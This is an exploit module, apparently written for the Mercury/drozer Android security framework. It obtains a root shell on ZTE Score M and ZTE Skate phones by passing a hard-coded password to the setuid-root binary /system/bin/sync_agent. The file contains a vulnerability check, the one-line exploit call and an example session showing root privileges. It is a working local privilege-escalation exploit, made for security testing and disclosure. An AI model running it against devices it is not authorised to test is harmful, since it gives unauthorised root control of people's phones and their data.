from mwr.droidhg.modules import common, Module

class ZTESyncAgent(Module, common.Vulnerability, common.Shell, common.ClassLoader, common.FileSystem):
    
    name = "Obtain a root shell on a ZTE Score M and ZTE Skate."
    description = """Exploit the setuid-root binary at /system/bin/sync_agent on certain ZTE devices to gain a root shell. It is as simple as providing it with the argument "ztex1609523", which is the hard-coded password in the binary.
    
This exploit has been reported to work on the ZTE Score M and the ZTE Skate.
"""
    examples = """
    mercury> run exploit.root.ztesyncagent
    # id
    uid=0(root) gid=0(root)
    # 
    """
    author = ["Anonymous (http://pastebin.com/wamYsqTV)", "Tyrone (@mwrlabs)"]
    date = "2012-12-17"
    license = "MWR Code License"
    path = ["exploit", "root"]
    
    def isVulnerable(self, arguments):
        
        if self.exists("/system/bin/sync_agent"):
            return True
        else:
            return False

    def exploit(self, arguments):
        
        self.shellStart("sync_agent ztex1609523")
